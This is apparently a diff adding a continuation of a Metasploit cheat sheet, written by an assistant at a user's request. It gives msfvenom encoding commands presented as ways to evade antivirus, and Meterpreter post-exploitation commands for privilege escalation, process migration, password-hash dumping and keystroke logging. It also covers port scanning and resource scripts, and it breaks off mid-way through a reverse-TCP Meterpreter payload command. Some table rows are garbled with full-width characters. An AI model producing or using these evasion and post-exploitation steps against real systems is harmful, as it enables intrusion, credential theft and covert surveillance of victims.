@@ -66,3 +66,35 @@ Here’s the completed **MSFConsole Cheat Sheet** table with additional essentia
    - Use `msfvenom` (outside `msfconsole`) to create standalone payloads (e.g., `.exe`, `.apk`, `.php`).  
    Example:
 continue,append but dont start from the begining
+
+
+Here’s the continuation of the **MSFConsole Cheat Sheet**, focusing on advanced usage, evasion techniques, and additional utilities:  
+
+---
+
+### **Cheat Sheet Table (Advanced)**  
+
+| **Category**          | **Command**                         | **Description**                                               |
+|----------------------|-------------------------------------|-------------------------------------------------------------|
+| **Evasion**          | `msfvenom --list encoders`          | List available encoders to evade AV.                        |
+|                      | `msfvenom -p [payload] -e [encoder] -i [iterations]` | Encode payload (e.g., `-e x86/shikata_ga_nai -i 5`).        |
+|                      | `set EnableStageEncoding true`      | Enable payload staging encoding (in `msfconsole`).          |
+| **Post-Exploitation (Meterpreter)** | `meterpreter> getuid`       | Check current user privileges.                              |
+|                      | `meterpreter> getsystem`            | Attempt privilege escalation.                               |
+|                      | `meterpreter> migrate [PID]`        | Move to another process (e.g., `explorer.exe`).             |
+|                      | `meterpreter> hashdump`             | Dump password hashes (requires admin).                     |
+|                      | `meterpreter> keyscan_start/stop/dump` | Log keystrokes from the target.                           |
+| **Auxiliary Modules** ｜　`use auxiliary/scanner/portscan/tcp` ｜ Load a port scanner module． ｜
+｜                     ｜　`set PORTS [range]`                  ｜ Define ports to scan (e.g., `1-1000`)．                ｜
+｜                     ｜　`run`                                ｜ Execute the scanner．                                   ｜
+| **Resource Scripts**   | `makerc [file.txt]`                | Save executed commands to a script for reuse.               |
+|                       | `resource [file.txt]`              | Run commands from a saved script.                           |
+
+---
+
+### **Key Notes:**  
+1. **Evasion Techniques**:  
+   - Use encoders (`shikata_ga_nai`) and obfuscation to bypass AV.  
+   Example:  
+   ```bash
+   msfvenom -p windows/meterpreter/reverse_tcp LHOST
